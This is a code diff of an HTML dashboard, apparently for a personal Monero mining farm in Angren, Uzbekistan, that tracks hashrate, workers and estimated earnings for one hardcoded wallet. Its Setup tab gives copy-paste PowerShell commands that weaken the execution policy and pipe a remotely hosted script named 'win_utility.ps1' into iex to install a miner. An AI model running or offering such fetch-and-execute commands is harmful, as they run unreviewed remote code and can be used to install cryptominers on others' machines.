@@ -3,112 +3,207 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XMR Farm: Pro Dashboard v14.7</title>
+    <title>XMR Farm: Ultima Dashboard v15.0</title>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
         :root {
-            --bg-color: #0b0f1a;
-            --glass-bg: rgba(255, 255, 255, 0.03);
-            --glass-border: rgba(255, 255, 255, 0.1);
+            --bg-color: #05080f;
+            --panel-bg: rgba(13, 18, 30, 0.7);
+            --accent-glow: rgba(56, 189, 248, 0.4);
             --accent-color: #38bdf8;
             --money-color: #4ade80;
             --uzs-color: #fbbf24;
             --text-color: #f1f5f9;
+            --border: rgba(255, 255, 255, 0.08);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; cursor: none; }
-        body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Segoe UI', Tahoma, sans-serif; min-height: 100vh; line-height: 1.6; overflow-x: hidden; }
+        body { 
+            background-color: var(--bg-color); 
+            color: var(--text-color); 
+            font-family: 'JetBrains Mono', 'Segoe UI', monospace; 
+            min-height: 100vh;
+            overflow-x: hidden;
+            background: radial-gradient(circle at 50% 50%, #0d121e 0%, #05080f 100%);
+        }
 
+        /* Навигация */
         .nav-tabs {
-            display: flex; justify-content: center; gap: 15px; padding: 20px 0;
-            position: sticky; top: 0; background: rgba(11, 15, 26, 0.95); backdrop-filter: blur(15px); z-index: 100;
-            border-bottom: 1px solid var(--glass-border);
+            display: flex; justify-content: center; gap: 20px; padding: 25px;
+            position: sticky; top: 0; background: rgba(5, 8, 15, 0.8); backdrop-filter: blur(20px); z-index: 100;
+            border-bottom: 1px solid var(--border);
         }
 
         .tab-btn {
-            background: var(--glass-bg); border: 1px solid var(--glass-border); color: var(--text-color);
-            padding: 10px 25px; border-radius: 12px; font-weight: 600; transition: 0.3s; font-size: 0.9rem; cursor: pointer;
+            background: transparent; border: 1px solid var(--border); color: var(--text-color);
+            padding: 12px 30px; border-radius: 8px; font-weight: bold; transition: 0.4s;
+            text-transform: uppercase; letter-spacing: 2px; font-size: 0.8rem;
         }
 
-        .tab-btn.active { background: var(--accent-color); color: #000; box-shadow: 0 0 20px rgba(56, 189, 248, 0.4); }
+        .tab-btn.active { 
+            background: var(--accent-color); color: #000; 
+            box-shadow: 0 0 30px var(--accent-glow); border-color: var(--accent-color);
+        }
 
-        .container { max-width: 1000px; margin: 0 auto; width: 95%; padding: 20px 0; }
-        .section { display: none; animation: fadeIn 0.4s ease-out; }
+        .container { max-width: 1200px; margin: 0 auto; width: 95%; padding: 30px 0; }
+        .section { display: none; animation: slideUp 0.5s ease-out; }
         .section.active { display: block; }
 
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; margin-bottom: 30px; }
-        .stat-card { 
-            background: var(--glass-bg); backdrop-filter: blur(10px); 
-            border: 1px solid var(--glass-border); padding: 20px; border-radius: 20px; text-align: center;
-        }
-        .stat-card span { display: block; font-size: 0.75rem; opacity: 0.5; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 1px; }
-        .stat-card b { font-size: 1.6rem; display: block; letter-spacing: -0.5px; }
-
-        #balance_usd { color: var(--money-color); }
-        #balance_uzs { color: var(--uzs-color); font-size: 1rem; margin-top: 5px; }
-
-        .log-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
+        /* Сетка показателей */
+        .main-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-bottom: 30px; }
         
-        .pc-card {
-            background: var(--glass-bg); border: 1px solid var(--glass-border);
-            padding: 25px; border-radius: 20px; text-align: center; position: relative; overflow: hidden;
+        .glass-card { 
+            background: var(--panel-bg); backdrop-filter: blur(15px); 
+            border: 1px solid var(--border); padding: 25px; border-radius: 15px;
+            position: relative; overflow: hidden; transition: 0.3s;
+        }
+        .glass-card:hover { border-color: var(--accent-color); transform: translateY(-5px); }
+        
+        .label { font-size: 0.7rem; opacity: 0.5; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; display: block; }
+        .value { font-size: 1.8rem; font-weight: 800; display: block; }
+
+        /* График */
+        .chart-container { 
+            background: var(--panel-bg); border: 1px solid var(--border); 
+            padding: 20px; border-radius: 15px; margin-bottom: 30px; height: 300px;
         }
 
-        .glass-cursor { 
-            position: fixed; width: 25px; height: 25px; background: rgba(255,255,255,0.05); 
-            border-radius: 50%; pointer-events: none; z-index: 9999; backdrop-filter: blur(4px);
-            transform: translate(-50%, -50%); border: 1px solid rgba(255,255,255,0.1);
+        /* Доходность */
+        .profit-table { width: 100%; border-collapse: collapse; margin-top: 15px; }
+        .profit-table td { padding: 10px 0; border-bottom: 1px solid var(--border); font-size: 0.9rem; }
+        .p-val { text-align: right; color: var(--money-color); font-weight: bold; }
+
+        /* Воркеры */
+        .worker-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
+        .node-card {
+            background: linear-gradient(145deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0.01) 100%);
+            border: 1px solid var(--border); padding: 25px; border-radius: 20px; position: relative;
         }
 
-        .footer { text-align: center; padding: 40px 0; opacity: 0.3; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 2px; }
-        code { display: block; background: rgba(0,0,0,0.4); padding: 15px; border-radius: 10px; color: var(--accent-color); margin-top: 10px; word-break: break-all; font-family: 'Consolas', monospace; font-size: 0.85rem; border: 1px solid var(--glass-border); }
+        /* Кастомный курсор */
+        .cursor {
+            position: fixed; width: 30px; height: 30px; border: 1px solid var(--accent-color);
+            border-radius: 50%; pointer-events: none; z-index: 9999; transition: transform 0.1s;
+            background: rgba(56, 189, 248, 0.1); backdrop-filter: blur(2px);
+        }
+
+        code { 
+            display: block; background: #000; padding: 20px; border-radius: 12px; 
+            color: var(--accent-color); border: 1px solid var(--border); position: relative;
+            font-size: 0.8rem; margin: 15px 0;
+        }
+        .copy-hint { position: absolute; right: 15px; top: 15px; font-size: 0.6rem; opacity: 0.5; }
     </style>
 </head>
 <body>
 
-<div class="glass-cursor"></div>
+<div class="cursor" id="cursor"></div>
 
 <nav class="nav-tabs">
-    <button class="tab-btn active" onclick="switchTab(this, 'dashboard')">📊 Dashboard</button>
-    <button class="tab-btn" onclick="switchTab(this, 'install')">🛠 Установка</button>
+    <button class="tab-btn active" onclick="switchTab(this, 'dashboard')">🛰 Terminal</button>
+    <button class="tab-btn" onclick="switchTab(this, 'profit')">💰 Finance</button>
+    <button class="tab-btn" onclick="switchTab(this, 'install')">🛠 Setup</button>
 </nav>
 
 <div class="container">
     <section id="dashboard" class="section active">
-        <div class="grid">
-            <div class="stat-card"><span>Общая Мощность</span><b id="hashrate">0.00 KH/s</b></div>
-            <div class="stat-card"><span>Воркеры</span><b id="workers">0</b></div>
-            <div class="stat-card"><span>Баланс XMR</span><b id="balance_xmr">0.000000</b></div>
-            <div class="stat-card">
-                <span>Доход (Баланс)</span>
-                <b id="balance_usd">$0.00</b>
-                <b id="balance_uzs">0 UZS</b>
+        <div class="main-grid">
+            <div class="glass-card">
+                <span class="label">Live Hashrate</span>
+                <b class="value" id="hashrate" style="color: var(--accent-color);">0.00 KH/s</b>
+                <div style="height: 4px; width: 100%; background: #1a2234; margin-top: 15px; border-radius: 2px;">
+                    <div id="hashBar" style="height: 100%; width: 0%; background: var(--accent-color); transition: 1s; box-shadow: 0 0 10px var(--accent-color);"></div>
+                </div>
+            </div>
+            <div class="glass-card">
+                <span class="label">Network Status</span>
+                <b class="value" id="workers">Nodes: 0</b>
+                <span id="uptime" style="font-size: 0.7rem; color: var(--money-color);">System Online</span>
+            </div>
+            <div class="glass-card">
+                <span class="label">Pending Balance</span>
+                <b class="value" id="balance_xmr" style="color: var(--uzs-color);">0.000000</b>
+                <span id="balance_uzs" style="font-size: 0.8rem; opacity: 0.7;">0 UZS</span>
             </div>
         </div>
 
-        <h3 style="margin: 0 0 20px 10px; font-size: 0.9rem; color: var(--accent-color); text-transform: uppercase; letter-spacing: 1px;">Мониторинг узлов</h3>
-        <div id="logBox" class="log-container">Загрузка данных...</div>
+        <div class="chart-container">
+            <canvas id="hashChart"></canvas>
+        </div>
+
+        <div id="workerList" class="worker-grid"></div>
+    </section>
+
+    <section id="profit" class="section">
+        <div class="glass-card" style="max-width: 600px; margin: 0 auto;">
+            <span class="label">Profit Analytics (UZS)</span>
+            <table class="profit-table">
+                <tr><td>За 1 час</td><td class="p-val" id="p-hour">0 UZS</td></tr>
+                <tr><td>За 24 часа</td><td class="p-val" id="p-day">0 UZS</td></tr>
+                <tr><td>За неделю</td><td class="p-val" id="p-week">0 UZS</td></tr>
+                <tr><td>За месяц (30д)</td><td class="p-val" id="p-month" style="font-size: 1.2rem;">0 UZS</td></tr>
+            </table>
+            <p style="font-size: 0.6rem; opacity: 0.4; margin-top: 20px; text-align: center;">* Расчет базируется на текущем Pay Hashrate и курсе Monero</p>
+        </div>
     </section>
 
     <section id="install" class="section">
-        <div class="stat-card" style="text-align: left; margin-bottom: 20px;">
-            <h3 style="font-size: 1.1rem; color: var(--accent-color)">1. Разблокировка PowerShell</h3>
-            <code onclick="copyCode(this)">Set-ExecutionPolicy RemoteSigned -Force</code>
-        </div>
-        <div class="stat-card" style="text-align: left;">
-            <h3 style="font-size: 1.1rem; color: var(--accent-color)">2. Команда установки</h3>
-            <code onclick="copyCode(this)">powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm 'https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/main/win_utility.ps1' | iex"</code>
+        <div class="glass-card">
+            <span class="label">Step 01: Global Bypass</span>
+            <code onclick="copyCode(this)">
+                Set-ExecutionPolicy RemoteSigned -Force
+                <span class="copy-hint">Click to copy</span>
+            </code>
+            
+            <span class="label">Step 02: Deploy Miner Engine</span>
+            <code onclick="copyCode(this)">
+                powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm 'https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/main/win_utility.ps1' | iex"
+                <span class="copy-hint">Click to copy</span>
+            </code>
         </div>
     </section>
 
-    <div class="footer">MONERO OCEAN MONITOR | ANGREN, UZBEKISTAN | v14.7</div>
+    <div class="footer">ULTIMA ENGINE | ANGREN, UZBEKISTAN | v15.0.4</div>
 </div>
 
 <script>
     const WALLET = '429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA';
-    let xmrPrice = 168.50; 
-    let uzsRate = 12950;
+    let xmrPrice = 168.00;
+    let uzsRate = 12980;
+    let hashHistory = Array(20).fill(0);
+    let chart;
+
+    // Инициализация графика
+    function initChart() {
+        const ctx = document.getElementById('hashChart').getContext('2d');
+        chart = new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: Array(20).fill(''),
+                datasets: [{
+                    label: 'Hashrate KH/s',
+                    data: hashHistory,
+                    borderColor: '#38bdf8',
+                    borderWidth: 3,
+                    pointRadius: 0,
+                    fill: true,
+                    backgroundColor: 'rgba(56, 189, 248, 0.1)',
+                    tension: 0.4
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                scales: { 
+                    y: { grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: '#555' } },
+                    x: { display: false }
+                },
+                plugins: { legend: { display: false } }
+            }
+        });
+    }
 
     function switchTab(btn, tabId) {
         document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
@@ -117,91 +212,102 @@
         btn.classList.add('active');
     }
 
-    function copyCode(el) {
-        navigator.clipboard.writeText(el.innerText);
-        el.style.color = "var(--money-color)";
-        setTimeout(() => el.style.color = "var(--accent-color)", 800);
-    }
-
     async function fetchRates() {
         try {
             const [resXMR, resUZS] = await Promise.all([
                 fetch('https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd').then(r => r.json()),
                 fetch('https://open.er-api.com/v6/latest/USD').then(r => r.json())
             ]);
-            if(resXMR.monero) xmrPrice = resXMR.monero.usd;
-            if(resUZS.rates) uzsRate = resUZS.rates.UZS;
-        } catch (e) { console.warn("Rates fallback"); }
+            xmrPrice = resXMR.monero.usd;
+            uzsRate = resUZS.rates.UZS;
+        } catch (e) { console.warn("Rate Fetch Error"); }
     }
 
-    async function fetchAllData() {
+    async function updateData() {
         await fetchRates();
-        const logBox = document.getElementById('logBox');
         const ts = Date.now();
-
         try {
             const [resStats, resIdent] = await Promise.all([
                 fetch(`https://api.moneroocean.stream/miner/${WALLET}/stats?_=${ts}`).then(r => r.json()),
                 fetch(`https://api.moneroocean.stream/miner/${WALLET}/identifiers?_=${ts}`).then(r => r.json())
             ]);
 
+            const currentHash = resStats.hash2 / 1000;
             const xmrBalance = resStats.amtDue / 1e12;
-            const totalUSD = xmrBalance * xmrPrice;
-            const totalUZS = totalUSD * uzsRate;
-
-            document.getElementById('hashrate').innerText = (resStats.hash2 / 1000).toFixed(2) + ' KH/s';
-            document.getElementById('workers').innerText = resIdent.length || 0;
+            
+            // Обновление UI
+            document.getElementById('hashrate').innerText = currentHash.toFixed(2) + ' KH/s';
+            document.getElementById('workers').innerText = 'Nodes: ' + (resIdent.length || 1);
             document.getElementById('balance_xmr').innerText = xmrBalance.toFixed(6);
-            document.getElementById('balance_usd').innerText = '$' + totalUSD.toFixed(2);
-            document.getElementById('balance_uzs').innerText = Math.round(totalUZS).toLocaleString() + ' UZS';
+            document.getElementById('balance_uzs').innerText = Math.round(xmrBalance * xmrPrice * uzsRate).toLocaleString() + ' UZS';
+            document.getElementById('hashBar').style.width = Math.min((currentHash / 30) * 100, 100) + '%';
 
-            logBox.innerHTML = '';
+            // Аналитика прибыли
+            const dailyXMR = (resStats.hash2 * 0.000000000046) * 86400; // Расчетный коэф пула
+            const dayUZS = dailyXMR * xmrPrice * uzsRate;
+            
+            document.getElementById('p-hour').innerText = Math.round(dayUZS / 24).toLocaleString() + ' UZS';
+            document.getElementById('p-day').innerText = Math.round(dayUZS).toLocaleString() + ' UZS';
+            document.getElementById('p-week').innerText = Math.round(dayUZS * 7).toLocaleString() + ' UZS';
+            document.getElementById('p-month').innerText = Math.round(dayUZS * 30).toLocaleString() + ' UZS';
 
-            const hasRealData = resIdent.some(pc => (pc.hash2 || pc.hash || 0) > 0);
+            // Обновление графика
+            hashHistory.push(currentHash);
+            hashHistory.shift();
+            chart.update();
 
-            if (!hasRealData && resStats.hash2 > 0) {
-                renderCard("Основная Ферма (E-MAXPC)", resStats.hash2, resStats.validShares);
-            } else if (resIdent.length > 0) {
-                resIdent.forEach(pc => {
-                    if (pc.identifier !== "global") {
-                        renderCard(pc.identifier || "Miner Node", pc.hash2 || 0, pc.validShares || 0);
-                    }
-                });
-            } else {
-                logBox.innerHTML = '<div style="grid-column: 1/-1; opacity:0.3; text-align:center; padding: 40px;">Нет активных данных...</div>';
-            }
-
-            function renderCard(name, speed, shares) {
-                const color = speed > 0 ? 'var(--accent-color)' : '#ef4444';
-                const card = document.createElement('div');
-                card.className = 'pc-card';
-                card.innerHTML = `
-                    <div style="font-size: 0.6rem; opacity: 0.4; text-transform: uppercase;">Node Identifier</div>
-                    <div style="font-weight: 800; color: #fff; margin: 10px 0; font-size: 1.1rem;">${name}</div>
-                    <div style="color: ${color}; font-size: 1.8rem; font-weight: 900;">
-                        ${(speed/1000).toFixed(2)} <span style="font-size: 0.9rem;">KH/s</span>
+            // Отрисовка воркеров
+            const list = document.getElementById('workerList');
+            list.innerHTML = '';
+            
+            const displayNodes = resIdent.length > 0 ? resIdent : [{identifier: 'E-MAXPC', hash2: resStats.hash2, validShares: resStats.validShares}];
+            
+            displayNodes.forEach(node => {
+                if(node.identifier === 'global') return;
+                const nodeCard = document.createElement('div');
+                nodeCard.className = 'node-card';
+                const health = node.hash2 > 0 ? 'Excellent' : 'Offline';
+                nodeCard.innerHTML = `
+                    <div style="display:flex; justify-content:space-between; align-items:flex-start;">
+                        <div>
+                            <span class="label" style="margin:0;">Node ID</span>
+                            <b style="font-size:1.2rem;">${node.identifier || 'E-MAXPC'}</b>
+                        </div>
+                        <div style="text-align:right;">
+                            <span style="display:block; font-size:0.6rem; color:var(--money-color); border:1px solid var(--money-color); padding:2px 6px; border-radius:4px;">${health}</span>
+                        </div>
                     </div>
-                    <div style="margin-top: 15px; font-size: 0.85rem; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 12px;">
-                        💎 <b>${Math.round(shares).toLocaleString()}</b> <span style="opacity:0.5">shares</span>
+                    <div style="margin-top:20px; color:var(--accent-color); font-size:1.5rem; font-weight:800;">
+                        ${((node.hash2 || resStats.hash2)/1000).toFixed(2)} <span style="font-size:0.8rem;">KH/s</span>
                     </div>
-                    <div style="position: absolute; bottom: 0; left: 0; height: 5px; width: 100%; background: ${color}; shadow: 0 0 10px ${color};"></div>
+                    <div style="margin-top:15px; display:flex; justify-content:space-between; font-size:0.7rem; opacity:0.6;">
+                        <span>💎 Shares: ${Math.round(node.validShares || resStats.validShares).toLocaleString()}</span>
+                        <span>v15.0 Stable</span>
+                    </div>
                 `;
-                logBox.appendChild(card);
-            }
-        } catch (e) { 
-            console.error(e);
-            logBox.innerHTML = '<div style="color:#ef4444; text-align:center;">Ошибка API. Проверьте Wallet.</div>';
-        }
+                list.appendChild(nodeCard);
+            });
+
+        } catch (e) { console.error("Update Error", e); }
     }
 
-    const cursor = document.querySelector('.glass-cursor');
+    // Курсор
     document.addEventListener('mousemove', e => {
-        cursor.style.left = e.clientX + 'px';
-        cursor.style.top = e.clientY + 'px';
+        const c = document.getElementById('cursor');
+        c.style.left = e.clientX + 'px';
+        c.style.top = e.clientY + 'px';
     });
 
-    fetchAllData();
-    setInterval(fetchAllData, 30000); 
+    function copyCode(el) {
+        navigator.clipboard.writeText(el.innerText.replace('Click to copy', '').trim());
+        const original = el.style.borderColor;
+        el.style.borderColor = 'var(--money-color)';
+        setTimeout(() => el.style.borderColor = original, 1000);
+    }
+
+    initChart();
+    updateData();
+    setInterval(updateData, 30000);
 </script>
 </body>
 </html>
